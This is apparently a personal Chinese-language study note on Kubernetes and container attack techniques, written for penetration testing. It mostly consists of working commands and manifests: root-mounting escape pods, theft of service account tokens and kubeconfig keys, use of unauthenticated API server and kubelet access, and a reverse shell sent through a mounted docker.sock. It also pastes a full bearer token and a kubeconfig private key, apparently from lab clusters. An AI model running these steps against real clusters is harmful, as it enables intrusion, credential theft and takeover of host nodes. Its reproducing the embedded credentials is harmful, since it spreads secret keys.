

![img](Kubernetes%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.assets/a63415e1-5986-475b-bd0a-2c1fc1e0c0f0.png)

# 执行

## 目录挂载逃逸

在控制了API Server之后的技术，考虑到和之前学的docker逃逸有点像而且后面漏洞的进一步利用要用到这个就先学一下。

简单来说就是控了apiserver之后创建一个pod将node节点的根目录挂载进来，就可以实现对node节点文件系统的控制，然后写入恶意crontab、web shell、ssh公钥，便可以从Pod逃逸到宿主机Node。

因此创建这么一个恶意pod就可以了，2种方式，一种是直接创建pod，一种是创建deployment。

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: evilpod
spec:
  containers:
  - image: nginx
    name: container
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
```

或者

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
  labels:
    app: nginx-test
spec:
  replicas: 1
  selector:
    matchLabels:
      app: nginx
  template:
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - image: nginx
        name: container
        volumeMounts:
        - mountPath: /mnt
          name: test-volume
      volumes:
      - name: test-volume
        hostPath:
          path: /
```

```shell
kubectl apply -f evilpod.yaml
kubectl get pods
kubectl exec -it evilpod /bin/bash
ls /mnt
```

渗透时利用的话用`kubectl -s http://xxxx`来利用就行了。

## 利用Service Account连接serverapi

k8s两种账号，用户账号和服务账号。

服务账户用于Pod与集群交互（如Pod调用api server提供的一些API进行一些活动）。

当有一个高权限的服务账号的时候，可以用它对应的服务账户身份调用api server向集群下达命令。pod的serviceaccount信息一般存放于/var/run/secrets/kubernetes.io/serviceaccount/目录下。

也可能存放在下面的位置：

```shell
/run/secrets/kubernetes.io/serviceaccount
/var/run/secrets/kubernetes.io/serviceaccount
/secrets/kubernetes.io/serviceaccout
```





创建高权限服务账号：

```shell
kubectl create serviceaccount feng
kubectl create clusterrolebinding cluster-admin-feng  --clusterrole=cluster-admin --serviceaccount=default:feng
```

修改`nginx-deployment.yaml`，指定`serviceAccountName: feng`：

```yaml
apiVersion: apps/v1	#与k8s集群版本有关，使用 kubectl api-versions 即可查看当前集群支持的版本
kind: Deployment	#该配置的类型，我们使用的是 Deployment
metadata:	        #译名为元数据，即 Deployment 的一些基本属性和信息
  name: nginx-deployment	#Deployment 的名称
  labels:	    #标签，可以灵活定位一个或多个资源，其中key和value均可自定义，可以定义多组，目前不需要理解
    app: nginx	#为该Deployment设置key为app，value为nginx的标签
spec:	        #这是关于该Deployment的描述，可以理解为你期待该Deployment在k8s中如何使用
  replicas: 4	#使用该Deployment创建一个应用程序实例
  selector:	    #标签选择器，与上面的标签共同作用，目前不需要理解
    matchLabels: #选择包含标签app:nginx的资源
      app: nginx
  template:	    #这是选择或创建的Pod的模板
    metadata:	#Pod的元数据
      labels:	#Pod的标签，上面的selector即选择包含标签app:nginx的Pod
        app: nginx
    spec:	    #期望Pod实现的功能（即在pod中部署）
      containers:	#生成container，与docker中的container是同一种
      - name: nginx	#container的名称
        image: nginx:1.8	#使用镜像nginx:1.7.9创建container，该container默认80端口可访问
      serviceAccountName: feng

```

之后：

```shell
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
curl --cacert $CA_CERT -H "Authorization: Bearer $TOKEN" "https://127.0.0.1:26443/version/"
```

(可惜我复现的时候不知道为什么没成功。。。我即使是default用户仍然有权限调用api server。。估计是kind的问题？？？)



复现（这部分是kubelet未授权攻击拿到的service account）：

```shell
kubeletctl -s 10.10.11.133 exec -p nginx -c nginx "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -i >
 token
 
 kubeletctl -s 10.10.11.133 exec -p nginx -c nginx "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" > ca.crt
 
kubectl  -s https://10.10.11.133:8443/ --token="eyJhbGciOiJSUzI1NiIsImtpZCI6IlpaUVJlT2h2Zk45WFA2MjdnY2FDVHlyNG9QdGRpQlJ1dHVvb0dGa0dYR3cifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI4MjgwMjYyLCJpYXQiOjE2OTY3NDQyNjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVkMzEyMjY5LTg1NTAtNDMxMS1hNjRkLTE2MmMwOTIzZDA5MyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjE5ZDk2N2E1LTM1MmYtNDQ4Yy1hYTI5LWZhM2EzM2U4MTJjMCJ9LCJ3YXJuYWZ0ZXIiOjE2OTY3NDc4Njl9LCJuYmYiOjE2OTY3NDQyNjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.Ur6RSW5k0lcnu0aEu5b56kSZM3R6uT8I_jXPqepOdnROJvhpy_Ens1Vr4c_UOcg6LyEV8GwVfkJVoxPbXplavv8wHV5JClgH-jnyBOvKC30xHZ-gi6Wcrt8f-pd6M1WyH2KynsnxHqlGqZSuyleZshfCCFFik_c6OQg2FHdVdkQ9RxLnmORKWr7kd7F2Mbaw7HbOeSXPGqoKBG99KK_iVz1c1tpUoGDst3im2MpA__PprqKhWGnXd4KncM4U_jJjeVynub3LH4URLzJ_J3Z8BhFScr367lwQImFwxHspKTfo0dGbiSCZVnTlGDs5mVeIRVGMMop1i5UhbUsUjGKSjw" --certificate-authority=ca.crt get pod
```

不一定用户就能执行所有命令，比如可以get pod但是不能get node

通过`auth can-i --list`来查看给定用户的所有权限：

```shell
kubectl --insecure-skip-tls-verify -s https://10.10.11.133:8443/ --token="eyJhbGciOiJSUzI1NiIsImtpZCI6IlpaUVJlT2h2Zk45WFA2MjdnY2FDVHlyNG9QdGRpQlJ1dHVvb0dGa0dYR3cifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI4MjgwMjYyLCJpYXQiOjE2OTY3NDQyNjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVkMzEyMjY5LTg1NTAtNDMxMS1hNjRkLTE2MmMwOTIzZDA5MyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjE5ZDk2N2E1LTM1MmYtNDQ4Yy1hYTI5LWZhM2EzM2U4MTJjMCJ9LCJ3YXJuYWZ0ZXIiOjE2OTY3NDc4Njl9LCJuYmYiOjE2OTY3NDQyNjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.Ur6RSW5k0lcnu0aEu5b56kSZM3R6uT8I_jXPqepOdnROJvhpy_Ens1Vr4c_UOcg6LyEV8GwVfkJVoxPbXplavv8wHV5JClgH-jnyBOvKC30xHZ-gi6Wcrt8f-pd6M1WyH2KynsnxHqlGqZSuyleZshfCCFFik_c6OQg2FHdVdkQ9RxLnmORKWr7kd7F2Mbaw7HbOeSXPGqoKBG99KK_iVz1c1tpUoGDst3im2MpA__PprqKhWGnXd4KncM4U_jJjeVynub3LH4URLzJ_J3Z8BhFScr367lwQImFwxHspKTfo0dGbiSCZVnTlGDs5mVeIRVGMMop1i5UhbUsUjGKSjw" auth can-i --list
```





# 初始访问

## 云账号AK泄漏

```bash
#各个厂商access key的开头
Amazon Web Services:AKIA ^AKIA[A-Za-z0-9]{16}$
Google Cloud Platform:GOOG ^GOOG[\w\W]{10,30}$
Microsoft Azure:AZ ^AZ[A-Za-z0-9]{34,40}$
IBM Cloud:IBM ^IBM[A-Za-z0-9]{10,40}$
Oracle Cloud:OCID ^OCID[A-Za-z0-9]{10,40}$
Alibaba Cloud:LTAI ^LTAI[A-Za-z0-9]{12,20}$
Tencent Cloud:AKID ^AKID[A-Za-z0-9]{13,20}$
Huawei Cloud:AK ^AK[\w\W]{10,62}$
Baidu Cloud:AK ^AK[A-Za-z0-9]{10,40}$
JD Cloud:AK ^AK[A-Za-z0-9]{10,40}$
UCloud:UC ^UC[A-Za-z0-9]{10,40}$
QingCloud:QY ^QY[A-Za-z0-9]{10,40}$
Kingsoft Cloud:KS3 ^KS3[A-Za-z0-9]{10,40}$
China Unicom Cloud:LTC ^LTC[A-Za-z0-9]{10,60}$
China Mobile Cloud:YD ^YD[A-Za-z0-9]{10,60}$
China Telecom Cloud:CTC ^CTC[A-Za-z0-9]{10,60}$
Yonyou Cloud: YYT ^YYT[A-Za-z0-9]{10,60}$
Yonyou Cloud:YY ^YY[A-Za-z0-9]{10,40}$
OUCDC:CI ^CI[A-Za-z0-9]{10,40}$
G-Core Labs:gcore ^gcore[A-Za-z0-9]{10,30}$
```







即accesskey的泄漏。

访问密钥AccessKey（AK）相当于登录密码，只是使用场景不同。AccessKey用于程序方式调用云服

务API，而登录密码用于登录控制台。如果您不需要调用API，那么就不需要创建AccessKey。

accesskey泄露主要有两种途径：1.硬编码在代码里 2.第三方存储

aksk，全称**access key secret key**，可以简单地理解为用于访问云上资源的一组密钥。 不同的云服务商aksk的名字不一样，国内比较常见的服务商有阿里云，腾讯云，华为云，aws 阿里云的ak都以 LTAI 开头，而腾讯云的ak则以 AKID 开头。

![image-20231011215809465](Kubernetes%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.assets/image-20231011215809465.png)

拿到aksk之后，利用cf工具（参考https://wiki.teamssix.com/CF/）：

首先配置：

![image-20231011215906934](Kubernetes%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.assets/image-20231011215906934.png)

配置完成之后就可以进行后续的操作了（可能权限会受限）：



```shell
#配置aksk
./cf config
#一键接管控制台
./cf console
```

具体操作参考cf文档。

## Api Server 服务未授权

Kubernetes是一个API服务器，它使用API在集群上提供所有操作。API服务器实现了一个接口，这意味着不同的工具和库可以轻松地与其进行通信。Kubeconfig是与可用于通信的服务器端工具一起的软件包。它公开了Kubernetes API。简而言之：读取与解析请求指令的中枢。

apiserver有2个端口：8080（insecure-port，非安全端口）和6443（secure-port，安全端口）。其中8080端口提供HTTP服务且无需身份认证。



1. `localhost` 端口:
   - 用于测试和引导，以及主控节点上的其他组件（调度器，控制器管理器）与 API 通信
   - 没有 TLS
   - 默认为端口 8080
   - 默认 IP 为 localhost，使用 `--insecure-bind-address` 进行更改
   - 请求 **绕过** 身份认证和鉴权模块
   - 由准入控制模块处理的请求
   - 受需要访问主机的保护
2. “安全端口”：
   - 尽可能使用
   - 使用 TLS。 用 `--tls-cert-file` 设置证书，用 `--tls-private-key-file` 设置密钥
   - 默认端口 6443，使用 `--secure-port` 更改
   - 默认 IP 是第一个非本地网络接口，使用 `--bind-address` 更改
   - 请求须经身份认证和鉴权组件处理
   - 请求须经准入控制模块处理
   - 身份认证和鉴权模块运行

因此尽量不该使用8080端口（无认证和鉴权），如果暴露了8080端口就会被攻击。但8080端口默认是不启用，且在高版本似乎无法通过配置启用，因此在低版本且配置不当的时候才能被攻击。



对于6443端口来说，不带任何凭证的访问 API server的 secure-port端口，默认会被服务器标记为system:anonymous用户。一般来说system:anonymous用户权限是很低的，但是如果运维人员管理失当，把system:anonymous用户绑定到了cluster-admin用户组，那么就意味着secure-port允许匿名用户以管理员权限向集群下达命令。（也就是secure-port变成某种意义上的insecure-port了）。



通过-s参数来直接访问apiserver（我的是从6443映射到了26443），用`--insecure-skip-tls-verify=true`来模拟不鉴权的情况：

```shell
kubectl -s https://127.0.0.1:26443/ --insecure-skip-tls-verify=true get nodes
```



或者设置：

```shell
kubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous
```

![image-20220705200857179](Kubernetes%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.assets/image-20220705200857179.png)



之后可以用下面的命令删除：

```shell
kubectl delete clusterrolebinding system:anonymous
```

实现了apiserver未授权创建恶意pod然后攻击即可。



## configfile泄漏

`K8s configfile` 作为 `K8s` 集群的管理凭证，其中包含有关 `K8s` 集群的详细信息（`API Server`、登录凭证）。

如果攻击者可以访问到或者开发者意外的将这个文件泄漏出去了（比如传到了github上），就会受到攻击。

用户凭证保存在 `kubeconfig` 文件中，`kubectl` 通过以下顺序来找到 `kubeconfig` 文件：

1. 如果提供了`--kubeconfig`参数，就使用提供的 `kubeconfig` 文件。
2. 如果没有提供`--kubeconfig` 参数，但设置了环境变量 `$KUBECONFIG`，则使用该环境变量提供的 `kubeconfig` 文件。
3. 如果以上两种情况都没有，`kubectl` 就使用默认的 `kubeconfig`文件 `$HOME/.kube/config`。（也可能在/var/lib/kubelet/kubeconfig）



可以看到我本地的：

```shell
12:28:58 › cat config
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMvakNDQWVhZ0F3SUJBZ0lCQURBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwcmRXSmwKY201bGRHVnpNQjRYRFRJeU1EY3dOVEE0TkRjeE1Wb1hEVE15TURjd01qQTRORGN4TVZvd0ZURVRNQkVHQTFVRQpBeE1LYTNWaVpYSnVaWFJsY3pDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBS0lHCkZCVkNxTEJoRk1DWlAyT2Jmb1lVM3FPTkhsSW4vYU0wWXFyekxxaEVsbUYrVzR3cWtNQmVYTzBZQkNWZ0dLZW8KbWhYOXVLVEw0eStiUzFINnU1dlEvNVJUR0l5WkVML3VHdWQzcytEZ3lKeVN0WER1YzIwNER5UjVuUWo2U2tDMgo1QVM5YXRqYzdWTFplV3JWamZBUVJoVEtJTlpWWEc1SC9Ic3RFWDMrQ0JzZlArbkEzSm1wcy81Tk92dFRramVyClJSZlQ2UXlBR1ZCTTFwbWJSeVFRc0FnWHFBdzI5QVhsRjhWaU9ETUZQT3AwdStUTXlIMnkwZXNVZTAyQVVVQVIKc1l1Z2dUcHZLNnJQaXBWU1Zqa2h0Y2tZNklOTWJwTHEvbFRnMDRGYVdCVlVKTEpueVJ6RW40TG4vY0hKajdvMgpnR2lZYWt5c2VpMEVaZUNNb01VQ0F3RUFBYU5aTUZjd0RnWURWUjBQQVFIL0JBUURBZ0trTUE4R0ExVWRFd0VCCi93UUZNQU1CQWY4d0hRWURWUjBPQkJZRUZEMVNqelVZcjdKRS9URXBIaVc1Ty9uZkwvRGJNQlVHQTFVZEVRUU8KTUF5Q0NtdDFZbVZ5Ym1WMFpYTXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBQmVBZXo3aEZocUZzbWRuaHEwbQpnbUo3RnVNUU1tUmlIZlpjeFVEMlh3RXREMjlXRWxLejZucUJjbDB1elorenViWXh4Ky9FQW1iK0ZlSGZEcEdkCmxuVmhxd2R0MUVrZkY2R0xaRmI2bFFyZ0RuU3gwNHVRY0VnMDlQb3lxbWZrSkpwQVdpQ0ZDalFWdVhlUnk1WUMKaEhOTERpdzFjVkxZQS9XV1RDYUFacW1qTFlTMVlMQ1U5ZGpNZlM5amtPcDc4MEhodGQydGFSWGlzU3RoRmRFUwpYS29lUC9UczcvVkFTYksvQ3Y0VzR5NWhIUXVyOHhtbnJmWlMrS3IrTDc5MzVVMkdJeWZqKzlhUXQ4TzZPTUorCi9kYkxocDZLdDdXUk9tOU93Tk5FdGdIV0xrb1VQSndyTWZWa0N0R2VMMGN5eWlQTmVsY1VjbnZxbHdOeDIrdzkKaWIwPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
    server: https://127.0.0.1:51092
  name: kind-k8s
contexts:
- context:
    cluster: kind-k8s
    user: kind-k8s
  name: kind-k8s
current-context: kind-k8s
kind: Config
preferences: {}
users:
- name: kind-k8s
  user:
    client-certificate-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURJVENDQWdtZ0F3SUJBZ0lJSHlJUVpPZi9IbzB3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TWpBM01EVXdPRFEzTVRGYUZ3MHlNekEzTURVd09EUTNNVEphTURReApGekFWQmdOVkJBb1REbk41YzNSbGJUcHRZWE4wWlhKek1Sa3dGd1lEVlFRREV4QnJkV0psY201bGRHVnpMV0ZrCmJXbHVNSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQXlTejVRc0hzZWVaTHRIbSsKTTdXcmNRUlNtNitZMk45YVBGTmF5Yk1sbE1ydmZCNUVNZ0xYVnp3WmttQUtpcUVvTm1KOXk3S1pWcVNXdVplUwp2UkZKd21SYzUvT0ZNdjhYcFJGSHZ0RE1uenpFZ21nQlFhbm4wOWx6SVUzOC9qd3pUYnV2V0F5a3ZmWU5WYm9pCmdzZjVOMmR4b28ySGVIbXdNRHFPR2lTQlhvZkZuUGlJL2lxOTlhdi9OTGZyMStKS08xMjUyYktTNCt4Y2wyWVoKM1lpYTJwU0xkd2Z5Z05MTHhUM1crOHU0VVI5SEdrU1gyREUyWjR3dDNSUnVRVjZPQkl6cFdXbS94SzRhZ29IZwpKU3VaQVNJQzRhaVR4cWtub0J0VGNGcm9EWjJZTCtxYmhqQm40QmdaS2c2eXpkZEdSOHF6ZkowSmJVR2hhWHlPClRSdU9Nd0lEQVFBQm8xWXdWREFPQmdOVkhROEJBZjhFQkFNQ0JhQXdFd1lEVlIwbEJBd3dDZ1lJS3dZQkJRVUgKQXdJd0RBWURWUjBUQVFIL0JBSXdBREFmQmdOVkhTTUVHREFXZ0JROVVvODFHSyt5UlAweEtSNGx1VHY1M3kvdwoyekFOQmdrcWhraUc5dzBCQVFzRkFBT0NBUUVBaUF6akVydi9WS1o0QTJkU0JObm4zRWsrMjlyWWY5RGNUT2VWCnlrSlhKem14WnBWN3FTY05kNkhIMXpCcGdDL0RHeEtKbSt3MkRhaE0rWHh1RllKbEpEbkxabUNYT3hVM3pUL0gKR1o0U2MzU3RBV3hiWWEwc3BwdTFQT3ppMUVTZGVSc2s2QTQ2Z01KbVc1TzBmZ3d4VFF3UHJYTUg2a0hwNnU4Ugo4aTFRWUI0Z0U0dC9DY0FzdkpRN0pCbENRZGRKMkw5MUFJMC9oVUlJUFRiNm1aZ3dPZXIvZVVwdHhnSG81UmF1Cjk2Z3VKbEJUT0pmZWRZUzdheHhHUUNwWUZoOFdBcFNOdFVYbXczZ1RrVXI0OHNJdHVvNmxZNVA4Vy9IUDd4V2EKZ1M2SlVLOVpCeFlkL3drUVBVamJQalBTTXVCNXMxdWd6ZnlFckh2Tk4xbTJIRElaclE9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
    client-key-data: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb2dJQkFBS0NBUUVBeVN6NVFzSHNlZVpMdEhtK003V3JjUVJTbTYrWTJOOWFQRk5heWJNbGxNcnZmQjVFCk1nTFhWendaa21BS2lxRW9ObUo5eTdLWlZxU1d1WmVTdlJGSndtUmM1L09GTXY4WHBSRkh2dERNbnp6RWdtZ0IKUWFubjA5bHpJVTM4L2p3elRidXZXQXlrdmZZTlZib2lnc2Y1TjJkeG9vMkhlSG13TURxT0dpU0JYb2ZGblBpSQovaXE5OWF2L05MZnIxK0pLTzEyNTJiS1M0K3hjbDJZWjNZaWEycFNMZHdmeWdOTEx4VDNXKzh1NFVSOUhHa1NYCjJERTJaNHd0M1JSdVFWNk9CSXpwV1dtL3hLNGFnb0hnSlN1WkFTSUM0YWlUeHFrbm9CdFRjRnJvRFoyWUwrcWIKaGpCbjRCZ1pLZzZ5emRkR1I4cXpmSjBKYlVHaGFYeU9UUnVPTXdJREFRQUJBb0lCQUVWRjFrTVZrYjliL0wrVgptRmduKzNQOFFCSGFBbkRUWURnYm44eUtncXRjd2VCa2I2a2s3MC9ib3hhVE9hNEkxbGI3elVOaUtZajdQZWVFCmVRUGZ1eDFULytYakpmK3NkVkRpeFdqQWIyVjV3RlVEU1VONkpSais3TFVRTE1qQ3BBdmxUL2lxeWVPYm9YWGUKbFZtaFVJQ3lmeCt4U20vQ3YxZXNJaGlBYjRmRDdvT01zVWg3NTg2MGFZSXRhdzBlWHRBVDc0OVVFMlYzYUd5awpGWWtBd2ZJVFBXVnJ4Ry9GNlFwTUhPMW1LckxiN1BuSytGUlJTUndiVTgvc3dEYUxBaVgvRURpMTBSTzZHWVVqCm16QnhlcnE1cDRNTTlTVnlHbi91TU9sTFZGRndqd3JjVFYyNWRrYkNycmt2QzRQT3VUQ1V4Yk1FT1dwQjZqMnEKWE1sTVM0a0NnWUVBNkdXdVZYUW56aDU0UURXemprZVhzNUZ0dGNIN0E0ajZaZ2NVQVgwd0hjZ0djRDZ4eWN1QwpzMkV3ekxESWdnaGRsMmp6WHpMREpJVmFkazF5bEMvNCtuNjB4cklXdHNXRlRIelhMb3NqZ3NjRFNhQ1ZubmZMCkg4UWltZHpqU2h1emtDbEQ2RXFIZXJ2UCtPeEJvM21GSmxBK1NZMmNnT2dEZlMxQ2FsS3pLclVDZ1lFQTNadUkKejQwVlkrZk9xRVIzUVVFWUdPQmhXTDBTUHp6ZjIvN2N0NFV5OE1XVmYwejRMUFRFYXpNY2R5cTUrVjNjVmRFOQphY3ZtM2dPdFBpUzFheTFTdk1VQldIdkRVZ2pZWEpjK0xHQ1JFRXF6V1pyZUtUbVlMN0x4b0JlSUJsaXVUTHRZCmhxeHIwUE1KdEszY0VrZk9RRHk1Z01WK3lYNVJ0RXdsc1lzem5rY0NnWUJyTnZYZDBLL0loUUFmUjJjbUhkdGIKNlp6K3ZKWnNoQlpaV2F5ZUh6NUNqeFNCVmpzNWlOMHNtb3NqOCs4ZEpuVGZOSGtMRTJVNkJSZTkrbThBOUx6ZAorL1Mwc2xhT1RjUDRqS1BOZ2oySXlQMjRTeENid2xLQXZrRGtVU2ErK3RhMWpJUWF0NytYSE95T3Y1aHNyZFNDCjM0Uk05THNlTVd2aXBTMjkxWmQ0L1FLQmdGN1pQUnNvVldsblE4bzlVNVY0V09uOHoyMTlyeHVsNEdKMm1OMXIKZ3p3T05VaEJGMCtXaTZNZVF5YTJBTmM4Vnh2YjdKOGxpSENwdmpLRTM2azV3dG5Nc0NEQkIvNUtqdUJDVTNnRwo5TSsyU1VFbXljTjNSUzNWTnhuQU9KWU95cnRJekVFSDl6VjljRUFHMGRSNUswdlBNYzV0dVRCZ2duUGF5NTlMCjV4SHRBb0dBRHUrWXd2R1ZnZWovMEpPRVZBc0FWQXJrRUllaVBiUEdWZy9US2pXbkVxQnpDY2lSVFFaZUxXYmwKMmVPK2greEJGUTA1b0pXK2x5bllxQkpNMUxvTWp0TUltZXE2TXJDaEZLMjJsR2FZMDZBYXJ4OGpkbmczL3ZrUwo1aENzSW0rUlUzeTNMT1VaZDV4U3FLa1M1dG5iUmVWamhGSDF5TmNOWkQrZmlpcW93STg9Ci0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg==
```

攻击流程：

```shell
echo $(grep client-cert ~/.kube/config |cut -d" " -f 6)| base64 -d > ./client.pem

echo $(grep client-key-data ~/.kube/config |cut -d" " -f 6)| base64 -d > ./client-key.pem

echo $(grep certificate-authority-data ~/.kube/config |cut -d" " -f 6)| base64 -d > ./ca.pem

kubectl config view |grep server

curl --cert ./client.pem --key ./client-key.pem --cacert ./ca.pem https://127.0.0.1:26443/api/v1/pods
```

就可以实现。



使用kubeconfig的用法：

```bash
kubectl --kubeconfig /var/lib/kubelet/kubeconfig get all -n kube-system
```





或者：

```shell
#内容放入config、或指定选项，需要修改Server地址
kubectl --kubeconfig k8s.yaml

#获取已接取的镜像
kubectl get pods --all-namespaces --insecure-skip-tls-verify=true -o jsonpath="{..image}" |tr -s '[[:space:]]' '\n' |sort |uniq -c

#创建Pod pod.yaml，将宿主机根目录挂载host文件
apiVersion: v1
kind: Pod
metadata:
  name: test-444
spec:
  containers:
  - name: test-444
    image: nginx:1.14.2
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
#在default命名空间中创建pod
kubectl apply -f pod.yaml -n default --insecure-skip-tls-verify=true

#进入容器中
kubectl exec -it test-444 bash -n default --insecure-skip-tls-verify=true

#切换bash，逃逸成功
cd /host
chroot ./ bash
```



## docker.sock利用

> Docker以server-client的形式工作，服务端叫Docker daemon，客户端叫docker client。
> Docker daemon想调用docker指令，就需要通过docker.sock这个文件向docker client进行通讯。换句话说，Docker daemon通过docker.sock这个文件去管理docker容器（如创建容器，容器内执行命令，查询容器状态等）。
> 同时，Docker daemon也可以通过配置将docker.sock暴露在端口上，一般情况下2375端口用于未认证的HTTP通信，2376用于可信的HTTPS通信。
>
> 

### 公网暴露

就是之前学的docker逃逸了：

https://blog.csdn.net/rfrder/article/details/122401691

### 利用现成的docker.sock

如果开发者想在docker容器内部执行docker命令需要把docker.sock挂载到容器里面，如果掌控了容器就可以进一步利用这个docker.sock来实现逃逸：

```shell
docker -v /var/run/docker.sock:/var/run/docker.sock

find / -name docker.sock
```

列出所有容器：

```bash
curl -s --unix-socket /custom/docker/docker.sock -X GET "http://localhost/containers/json"
```

之后利用这个来在任意容器里面执行命令：

```shell
curl -s --unix-socket /private/var/run/docker.sock -X POST "http://127.0.0.1/containers/c3644d347d69/exec" -H "Content-Type: application/json" --data-binary '{"Cmd": ["bash", "-c", "bash -i >& /dev/tcp/ip/39876 0>&1"]}'
```

c3644d347d69是容器的id。执行这个命令会得到一个类似这样的东西：`{"Id":"8023bc2791992af344bba85c5008ef93cc082c05a3401c2ee6b951abf9c05e50"}`。

把这个id填入下面的命令即可执行上面的Cmd命令：

```shell
curl -s --unix-socket /private/var/run/docker.sock -X POST "http://127.0.0.1/exec/8023bc2791992af344bba85c5008ef93cc082c05a3401c2ee6b951abf9c05e50/start" -H "Content-Type: application/json" --data-binary "{}"
```

之后仍然可以按照之前的思路来容器逃逸。

```bash
# create a privileged container with host root filesystem mounted - wtm@offensi.com
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name LiveOverflow-container -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start LiveOverflow-container
sudo docker -H unix:///google/host/var/run/docker.sock exec -it LiveOverflow-container /bin/sh
```





## kubelet未授权

kubelet是在Node上用于管理本机Pod的，kubectl是用于管理集群的。kubectl向集群下达指令，Node上的kubelet收到指令后以此来管理本机Pod。

kubelet的默认端口在10250（node机器上），配置文件在`/var/lib/kubelet/config.yaml`：

```yaml
apiVersion: kubelet.config.k8s.io/v1beta1
authentication:
  anonymous:
    enabled: false
  webhook:
    cacheTTL: 0s
    enabled: true
  x509:
    clientCAFile: /etc/kubernetes/pki/ca.crt
authorization:
  mode: Webhook
  webhook:
    cacheAuthorizedTTL: 0s
    cacheUnauthorizedTTL: 0s
cgroupDriver: systemd
cgroupRoot: /kubelet
clusterDNS:
- 10.96.0.10
clusterDomain: cluster.local
cpuManagerReconcilePeriod: 0s
evictionHard:
  imagefs.available: 0%
  nodefs.available: 0%
  nodefs.inodesFree: 0%
evictionPressureTransitionPeriod: 0s
failSwapOn: false
fileCheckFrequency: 0s
healthzBindAddress: 127.0.0.1
healthzPort: 10248
httpCheckFrequency: 0s
imageGCHighThresholdPercent: 100
imageMinimumGCAge: 0s
kind: KubeletConfiguration
logging:
  flushFrequency: 0
  options:
    json:
      infoBufferSize: "0"
  verbosity: 0
memorySwap: {}
nodeStatusReportFrequency: 0s
nodeStatusUpdateFrequency: 0s
rotateCertificates: true
runtimeRequestTimeout: 0s
shutdownGracePeriod: 0s
shutdownGracePeriodCriticalPods: 0s
staticPodPath: /etc/kubernetes/manifests
streamingConnectionIdleTimeout: 0s
syncFrequency: 0s
volumeStatsAggPeriod: 0s
```

其中的`  anonymous: enabled: false`设置kubelet能否被匿名访问，`authorization:  mode: Webhook`设置kubelet api的访问是否需要授权（这样即使匿名⽤户能够访问也不具备任何权限）。

默认情况：

![image-20220706132429354](Kubernetes%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.assets/image-20220706132429354.png)



如果修改配置文件的这两个部分：

```yaml
apiVersion: kubelet.config.k8s.io/v1beta1
authentication:
  anonymous:
    enabled: true
  webhook:
    cacheTTL: 0s
    enabled: true
  x509:
    clientCAFile: /etc/kubernetes/pki/ca.crt
authorization:
  mode: AlwaysAllow
  webhook:
    cacheAuthorizedTTL: 0s
    cacheUnauthorizedTTL: 0s
cgroupDriver: systemd
cgroupRoot: /kubelet
clusterDNS:
- 10.96.0.10
clusterDomain: cluster.local
cpuManagerReconcilePeriod: 0s
evictionHard:
  imagefs.available: 0%
  nodefs.available: 0%
  nodefs.inodesFree: 0%
